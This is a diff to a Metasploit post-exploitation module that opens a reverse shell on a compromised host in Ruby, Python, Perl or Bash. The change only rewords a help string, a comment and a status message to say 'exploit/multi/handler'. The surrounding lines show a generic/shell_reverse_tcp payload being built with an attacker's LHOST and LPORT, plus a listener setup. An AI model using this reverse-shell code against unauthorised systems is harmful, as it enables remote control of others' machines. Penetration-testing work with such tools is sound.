@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('LPORT',
           [false, 'Port for Payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an Exploit Multi Handler to receive the connection', false]),
+          [ true, 'Start an exploit/multi/handler to receive the connection', false]),
         OptEnum.new('TYPE', [true, 'Scripting environment on target to use for reverse shell',
           'auto', ['auto','ruby','python','perl','bash']])
       ], self.class)
@@ -111,12 +111,12 @@ class Metasploit3 < Msf::Post
     return conflict
   end
 
-  # Starts a multi/handler session
+  # Starts a exploit/multi/handler session
   def create_multihand(lhost,lport)
     pay = client.framework.payloads.create("generic/shell_reverse_tcp")
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    print_status("Starting exploit multi handler")
+    print_status("Starting exploit/multi/handler")
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = client.framework.exploits.create("multi/handler")
